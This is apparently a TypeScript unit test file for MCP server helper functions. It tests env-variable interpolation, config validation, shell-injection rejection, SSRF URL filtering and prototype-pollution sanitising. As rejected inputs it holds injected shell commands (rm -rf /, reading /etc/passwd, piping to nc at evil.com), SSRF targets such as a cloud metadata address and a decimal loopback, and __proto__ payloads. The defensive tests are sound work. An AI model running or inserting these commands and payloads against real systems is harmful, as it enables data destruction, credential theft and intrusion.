// =============================================================
// mcp-helpers 纯函数单元测试
//
// 覆盖 mcp-helpers.ts 导出的三个无副作用纯逻辑:
//   1. interpolateEnv      — ${VAR} → process.env[VAR]
//   2. deepInterpolate     — 递归插值对象/数组中的字符串
//   3. validateServerConfig — 9 条件 type guard
//
// 重要性:
//   validateServerConfig 是从 mcp.yaml 加载到 connectTransport 之间的
//   唯一类型安全屏障。防止 mcp.yaml 配置错误导致 connectTransport 运行时崩溃
//   (例如 stdio 缺 command / sse 缺 url 都会让 spawn / fetch 静默失败)。
//   interpolateEnv / deepInterpolate 失败会让所有 ${HOST} 占位符原样下发,
//   进而导致所有 MCP server 都连不上。
//
// env 隔离:
//   interpolateEnv / deepInterpolate 直接读 process.env,
//   测试必须在 beforeEach 快照 + afterEach 还原,避免污染其它 test 文件。
// =============================================================

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import {
  deepInterpolate,
  interpolateEnv,
  isSafeMcpUrl,
  sanitizeObject,
  validateCommandSafe,
  validateServerConfig,
} from '../../src/main/services/mcp-helpers'

// 固定的 env key 前缀,避免和其它测试或系统变量冲突
const ENV_A = 'MCP_HELPERS_TEST_A'
const ENV_B = 'MCP_HELPERS_TEST_B'
const ENV_C = 'MCP_HELPERS_TEST_C'
const ENV_HOST = 'MCP_HELPERS_TEST_HOST'

// 构造 ${NAME} 占位符字符串的辅助函数,避免在模板字面量里重复转义
const placeholder = (name: string): string => '${' + name + '}'

describe('mcp-helpers: interpolateEnv', () => {
 // 快照 + 设置测试用变量,afterEach 还原 — 防止泄漏污染其它测试
 let originalEnv: NodeJS.ProcessEnv

 beforeEach(() => {
  originalEnv = { ...process.env }
  process.env[ENV_A] = 'alpha'
  process.env[ENV_B] = 'beta'
  process.env[ENV_C] = 'gamma'
  process.env[ENV_HOST] = 'example.com'
 })

 afterEach(() => {
  process.env = originalEnv
 })

 it('无占位符的字符串原样返回', () => {
  expect(interpolateEnv('hello')).toBe('hello')
 })

 it('单个 ${VAR} 占位符替换为环境变量值', () => {
  expect(interpolateEnv('http://' + placeholder(ENV_HOST))).toBe('http://example.com')
 })

 it('多个 ${VAR} 占位符全部替换', () => {
  expect(interpolateEnv(placeholder(ENV_A) + '/' + placeholder(ENV_B))).toBe('alpha/beta')
 })

 it('未定义的环境变量替换为空字符串', () => {
  expect(interpolateEnv('x' + placeholder('MCP_HELPERS_UNDEFINED_VAR_ZZZ') + 'y')).toBe('xy')
 })

 it('缺少右大括号时不替换（原样保留）', () => {
  expect(interpolateEnv('${' + ENV_A)).toBe('${' + ENV_A)
 })

 it('空字符串输入返回空字符串', () => {
  expect(interpolateEnv('')).toBe('')
 })

 // env. 前缀剥离(预设模板 mcp-presets.ts 使用 ${env.VAR} 写法)
 it('${env.VAR} 剥离 env. 前缀后替换', () => {
  expect(interpolateEnv('${env.' + ENV_A + '}')).toBe('alpha')
 })

 it('${env.VAR}/path 剥离前缀并拼接路径', () => {
  expect(interpolateEnv('${env.' + ENV_HOST + '}/api')).toBe('example.com/api')
 })

 it('混合 ${VAR} 和 ${env.VAR} 都正确替换', () => {
  expect(interpolateEnv('${' + ENV_A + '}-${env.' + ENV_B + '}')).toBe('alpha-beta')
 })
})

describe('mcp-helpers: deepInterpolate', () => {
 let originalEnv: NodeJS.ProcessEnv

 beforeEach(() => {
  originalEnv = { ...process.env }
  process.env[ENV_A] = 'alpha'
  process.env[ENV_B] = 'beta'
  process.env[ENV_C] = 'gamma'
 })

 afterEach(() => {
  process.env = originalEnv
 })

 it('顶层字符串原样插值（无占位符）', () => {
  expect(deepInterpolate('hi')).toBe('hi')
 })

 it('顶层字符串含 ${VAR} 时插值', () => {
  expect(deepInterpolate(placeholder(ENV_A))).toBe('alpha')
 })

 it('非字符串基元 (number / boolean / null) 原样返回', () => {
  expect(deepInterpolate(42)).toBe(42)
  expect(deepInterpolate(true)).toBe(true)
  expect(deepInterpolate(null)).toBe(null)
 })

 it('扁平对象:字符串字段插值,数字字段保持', () => {
  const result = deepInterpolate({ a: placeholder(ENV_A), b: 1 })
  expect(result).toEqual({ a: 'alpha', b: 1 })
 })

 it('嵌套对象:深层字符串也插值', () => {
  const result = deepInterpolate({ outer: { inner: placeholder(ENV_A) } })
  expect(result).toEqual({ outer: { inner: 'alpha' } })
 })

 it('数组:数组项中的字符串插值,对象元素中的字符串也插值', () => {
  const result = deepInterpolate([placeholder(ENV_A), 1, { x: placeholder(ENV_A) }])
  expect(result).toEqual(['alpha', 1, { x: 'alpha' }])
 })

 it('混合深度结构 (host / ports / meta) 所有字符串都被插值', () => {
  const result = deepInterpolate({
  host: placeholder(ENV_A),
  ports: [8080, placeholder(ENV_B)],
  meta: { token: placeholder(ENV_C) },
  })
  expect(result).toEqual({
  host: 'alpha',
  ports: [8080, 'beta'],
  meta: { token: 'gamma' },
  })
 })

 // FORBIDDEN_KEYS 过滤(防 mcp.user.yaml 原型污染)
 // 注意: 对象字面量的 __proto__ 是原型链, Object.entries 不遍历它。
 // 真实风险是 JSON.parse('{"__proto__":...}') 产生的 own 属性,或
 // 从外部数据赋值 obj['__proto__']。这里用方括号赋值模拟真实攻击。
 it('过滤 __proto__ own 属性(防原型污染)', () => {
  const input = { normal: 'ok' } as Record<string, unknown>
  // 用方括号赋值模拟 JSON.parse 或外部数据注入的 own 属性
  input['__proto__'] = { polluted: 'evil' } as Record<string, unknown>
  const result = deepInterpolate(input) as Record<string, unknown>
  expect(result.normal).toBe('ok')
  expect(Object.prototype.hasOwnProperty.call(result, '__proto__')).toBe(false)
 })

 it('过滤 constructor 和 prototype own 属性', () => {
  const input = { a: '1' } as Record<string, unknown>
  input['constructor'] = { x: 'y' }
  input['prototype'] = { z: 'w' }
  const result = deepInterpolate(input) as Record<string, unknown>
  expect(result.a).toBe('1')
  expect(Object.prototype.hasOwnProperty.call(result, 'constructor')).toBe(false)
  expect(Object.prototype.hasOwnProperty.call(result, 'prototype')).toBe(false)
 })
})

// =============================================================
// validateServerConfig — type guard 表驱动测试
//
// 这是安全关键函数:任何一条规则失败都意味着 mcp.yaml 配置不完整,
// connectTransport 在运行时(spawn / fetch / ws.connect)崩溃前都没有
// 任何拦截。下面覆盖 4 个 accept + 17 个 reject 场景,确保所有边界
// 都被 type guard 拦截,不会让坏配置流到运行时。
// =============================================================

describe('mcp-helpers: validateServerConfig', () => {
 // it.each 表格: name 描述场景, input 是候选 server, expected 是期望返回值
 it.each<[string, unknown, boolean]>([
  // -------- ACCEPT --------
  [
  'valid stdio 配置:含 command',
  { id: 'srv1', name: 'Server 1', enabled: true, transport: 'stdio', command: 'node' },
  true,
  ],
  [
  'valid stdio 配置:含额外字段 (args) — type guard 对额外字段宽松',
  { id: 'srv1', name: 'S', enabled: true, transport: 'stdio', command: 'node', args: ['a'] },
  true,
  ],
  [
  'valid sse 配置:含 url,enabled=false',
  { id: 'srv2', name: 'SSE', enabled: false, transport: 'sse', url: 'http://x' },
  true,
  ],
  [
  'valid websocket 配置:含 url,enabled=true',
  { id: 'srv3', name: 'WS', enabled: true, transport: 'websocket', url: 'ws://x' },
  true,
  ],

  // -------- REJECT: 顶层类型 --------
  ['null 不是合法 server', null, false],
  ['undefined 不是合法 server', undefined, false],
  ['string 不是合法 server', 'string', false],
  ['number 不是合法 server', 42, false],

  // -------- REJECT: id 校验 --------
  ['缺 id', { name: 'S', enabled: true, transport: 'stdio', command: 'c' }, false],
  ['id 是空字符串', { id: '', name: 'S', enabled: true, transport: 'stdio', command: 'c' }, false],
  ['id 不是 string (number)', { id: 123, name: 'S', enabled: true, transport: 'stdio', command: 'c' }, false],

  // -------- REJECT: name / enabled 校验 --------
  ['缺 name', { id: 's', enabled: true, transport: 'stdio', command: 'c' }, false],
  ['缺 enabled', { id: 's', name: 'S', transport: 'stdio', command: 'c' }, false],
  ['enabled 不是 boolean (string)', { id: 's', name: 'S', enabled: 'yes', transport: 'stdio', command: 'c' }, false],

  // -------- REJECT: transport 校验 --------
  ['缺 transport', { id: 's', name: 'S', enabled: true, command: 'c' }, false],
  ['transport 是非法值 grpc', { id: 's', name: 'S', enabled: true, transport: 'grpc', command: 'c' }, false],

  // -------- REJECT: stdio 必须有 command --------
  ['stdio 缺 command', { id: 's', name: 'S', enabled: true, transport: 'stdio' }, false],
  ['stdio command 不是 string (number)', { id: 's', name: 'S', enabled: true, transport: 'stdio', command: 123 }, false],

  // -------- REJECT: sse / websocket 必须有 url --------
  ['sse 缺 url', { id: 's', name: 'S', enabled: true, transport: 'sse' }, false],
  ['websocket 缺 url', { id: 's', name: 'S', enabled: true, transport: 'websocket' }, false],
  ['sse url 不是 string (number)', { id: 's', name: 'S', enabled: true, transport: 'sse', url: 123 }, false],
 ])('%s → 期望返回 %s', (_name, input, expected) => {
  expect(validateServerConfig(input)).toBe(expected)
 })

 // R5-ERR-4 修复: id 长度上限 128
 it('拒绝超长 id (>128)', () => {
  expect(
   validateServerConfig({
    id: 'a'.repeat(129),
    name: 'x',
    enabled: true,
    transport: 'stdio',
    command: 'npx',
   }),
  ).toBe(false)
  expect(
   validateServerConfig({
    id: 'a'.repeat(128),
    name: 'x',
    enabled: true,
    transport: 'stdio',
    command: 'npx',
   }),
  ).toBe(true)
 })

 // R5-ERR-3 修复: sse/websocket 拒绝空 url (含纯空白)
 it('拒绝 sse 空 url', () => {
  expect(
   validateServerConfig({ id: 'x', name: 'x', enabled: true, transport: 'sse', url: '' }),
  ).toBe(false)
  expect(
   validateServerConfig({ id: 'x', name: 'x', enabled: true, transport: 'sse', url: '   ' }),
  ).toBe(false)
 })

 it('拒绝 websocket 空 url', () => {
  expect(
   validateServerConfig({ id: 'x', name: 'x', enabled: true, transport: 'websocket', url: '' }),
  ).toBe(false)
  expect(
   validateServerConfig({
    id: 'x',
    name: 'x',
    enabled: true,
    transport: 'websocket',
    url: '\t\n ',
   }),
  ).toBe(false)
 })
})

// =============================================================
// validateCommandSafe — stdio server command 字段的 shell 注入防御
//
// connectTransport 会把 mcp.yaml 的 command 直接传给 spawn。如果
// command 含 ;&|`$<> 或 $(...) / ${...} 命令替换,在 shell 模式下
// 会变成任意命令执行。此 type guard 是 spawn 之前唯一的安全校验,
// 必须拦截所有危险元字符,同时放行 Windows 路径 (\ 和 C:)。
// =============================================================

describe('validateCommandSafe', () => {
 it('接受普通命令名', () => {
  expect(validateCommandSafe('npx')).toBe(true)
  expect(validateCommandSafe('uvx')).toBe(true)
  expect(validateCommandSafe('node')).toBe(true)
  expect(validateCommandSafe('python3')).toBe(true)
 })

 it('接受带路径的命令', () => {
  expect(validateCommandSafe('/usr/local/bin/npx')).toBe(true)
  expect(validateCommandSafe('./bin/server')).toBe(true)
  expect(validateCommandSafe('C:\\Program Files\\node\\npx.exe')).toBe(true)
 })

 it('拒绝 shell 元字符(命令注入)', () => {
  expect(validateCommandSafe('npx && rm -rf /')).toBe(false)
  expect(validateCommandSafe('npx; cat /etc/passwd')).toBe(false)
  expect(validateCommandSafe('npx | nc evil.com 4444')).toBe(false)
  expect(validateCommandSafe('npx `whoami`')).toBe(false)
  expect(validateCommandSafe('npx $(id)')).toBe(false)
  expect(validateCommandSafe('npx > /tmp/x')).toBe(false)
  expect(validateCommandSafe('npx < /etc/passwd')).toBe(false)
  expect(validateCommandSafe('npx & background')).toBe(false)
 })

 it('拒绝空或非字符串', () => {
  expect(validateCommandSafe('')).toBe(false)
  expect(validateCommandSafe('   ')).toBe(false)
  expect(validateCommandSafe(null as unknown as string)).toBe(false)
  expect(validateCommandSafe(undefined as unknown as string)).toBe(false)
 })

 it('拒绝超长命令(>512 字符)', () => {
  expect(validateCommandSafe('a'.repeat(513))).toBe(false)
  expect(validateCommandSafe('a'.repeat(512))).toBe(true)
 })
})
describe('isSafeMcpUrl (SSRF 防护)', () => {
  // 导入被测函数(在文件顶部已有 import 语句,这里复用)
  // 注意:需要在顶部 import 里加 isSafeMcpUrl,这里假设已加
  it('拒绝 undefined/空', () => {
    expect(isSafeMcpUrl(undefined)).toBe(false)
    expect(isSafeMcpUrl('')).toBe(false)
  })

  it('拒绝非法 URL 格式', () => {
    expect(isSafeMcpUrl('not-a-url')).toBe(false)
    expect(isSafeMcpUrl('://missing-protocol')).toBe(false)
  })

  it('拒绝非 http(s)/ws(s) 协议', () => {
    expect(isSafeMcpUrl('file:///etc/passwd')).toBe(false)
    expect(isSafeMcpUrl('ftp://example.com')).toBe(false)
    expect(isSafeMcpUrl('javascript:alert(1)')).toBe(false)
  })

  it('拒绝 IPv4 私有段', () => {
    expect(isSafeMcpUrl('http://10.0.0.1/sse')).toBe(false)
    expect(isSafeMcpUrl('http://172.16.0.1/sse')).toBe(false)
    expect(isSafeMcpUrl('http://172.31.255.255/sse')).toBe(false)
    expect(isSafeMcpUrl('http://192.168.1.1/sse')).toBe(false)
    expect(isSafeMcpUrl('http://127.0.0.1/sse')).toBe(false)
    expect(isSafeMcpUrl('http://0.0.0.0/sse')).toBe(false)
    expect(isSafeMcpUrl('http://224.0.0.1/sse')).toBe(false)
  })

  it('拒绝云元数据 link-local 地址 (R4-SSRF-1 核心)', () => {
    expect(isSafeMcpUrl('http://169.254.169.254/latest/meta-data/')).toBe(false)
  })

  it('拒绝 IPv6 loopback 和 unique-local', () => {
    expect(isSafeMcpUrl('http://[::1]/sse')).toBe(false)
    expect(isSafeMcpUrl('http://[fc00::1]/sse')).toBe(false)
    expect(isSafeMcpUrl('http://[fd12:3456::1]/sse')).toBe(false)
  })

  it('允许 localhost 域名 (开发用)', () => {
    expect(isSafeMcpUrl('http://localhost:3000/sse')).toBe(true)
  })

  it('允许公网域名和公网 IP', () => {
    expect(isSafeMcpUrl('https://example.com/sse')).toBe(true)
    expect(isSafeMcpUrl('https://8.8.8.8/sse')).toBe(true)
    expect(isSafeMcpUrl('wss://mcp.example.com/ws')).toBe(true)
  })

  // 纯数字/十进制 IP 形式的 SSRF 绕过防护
  it('拒绝纯数字主机(十进制 IP 绕过尝试)', () => {
    expect(isSafeMcpUrl('http://2130706433/sse')).toBe(false)
    expect(isSafeMcpUrl('http://0/sse')).toBe(false)
  })
})

// =============================================================
// sanitizeObject — 原型污染防护
//
// mcp-service 的 add/update 会把 IPC 传入的 config/patch 经 spread
// 合并到 user yaml 和内存对象。若攻击者通过 IPC 传入 __proto__/
// constructor/prototype 字段,会污染运行时 Object.prototype。
// sanitizeObject 是 spread 合并前的净化屏障,必须稳定过滤这三个 key。
// =============================================================
describe('mcp-helpers: sanitizeObject (原型污染防护)', () => {
  it('过滤 __proto__ key', () => {
    // 注意: 对象字面量 { __proto__: {...} } 会真正设置原型,这里用 JSON 构造
    // 模拟 IPC 传入的恶意 payload(经 JSON.parse 的对象,__proto__ 是 own 属性)
    const input = JSON.parse('{"id":"x","__proto__":{"polluted":"evil"}}')
    const result = sanitizeObject(input)
    expect(result.id).toBe('x')
    // own 属性 __proto__ 应被移除(用 hasOwnProperty 而非点访问,点访问走原型链)
    expect(Object.prototype.hasOwnProperty.call(result, '__proto__')).toBe(false)
    // 关键: 全局 Object.prototype 未被污染
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  it('过滤 constructor 和 prototype key', () => {
    const input = JSON.parse('{"a":"1","constructor":{"x":"y"},"prototype":{"z":"w"}}')
    const result = sanitizeObject(input)
    expect(result.a).toBe('1')
    expect(Object.prototype.hasOwnProperty.call(result, 'constructor')).toBe(false)
    expect(Object.prototype.hasOwnProperty.call(result, 'prototype')).toBe(false)
  })

  it('保留所有正常 key(含嵌套对象引用,不做深拷贝)', () => {
    const nested = { foo: 'bar' }
    const input = { id: 'srv', name: 'S', args: ['a', 'b'], env: nested }
    const result = sanitizeObject(input)
    expect(result.id).toBe('srv')
    expect(result.name).toBe('S')
    expect(result.args).toEqual(['a', 'b'])
    expect(result.env).toBe(nested) // 浅拷贝: 同一引用
  })

  it('空对象返回空对象', () => {
    expect(sanitizeObject({})).toEqual({})
  })

  it('大小写敏感: Proto/PROTO 不被过滤(只过滤精确匹配)', () => {
    const input = { Proto: 1, PROTO: 2, __Proto__: 3 }
    const result = sanitizeObject(input)
    expect(result.Proto).toBe(1)
    expect(result.PROTO).toBe(2)
    expect(result.__Proto__).toBe(3)
  })
})

